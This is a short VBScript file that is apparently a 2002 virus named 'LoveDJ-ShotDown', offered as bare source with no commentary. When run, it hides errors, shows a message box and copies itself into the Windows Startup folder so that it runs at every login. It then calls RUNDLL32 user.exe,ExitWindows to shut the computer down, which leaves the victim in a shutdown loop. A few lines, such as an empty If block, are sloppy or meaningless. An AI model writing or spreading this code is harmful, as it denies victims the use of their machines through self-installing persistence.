   On Error Resume Next
   Dim VT
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   Set VT = WScript.CreateObject ("WScript.shell")
   msgbox"VT vir(LoveDJ-ShotDown) CopyRight 2002"
   Set c = fso.GetFile(WScript.ScriptFullName)
   c.Copy("c:\windows\startm~1\programs\run"&"\ÿ.vbs")
   VT.run "RUNDLL32.EXE user.exe,ExitWindows"
   VT.run=True
   If True Then
   End If
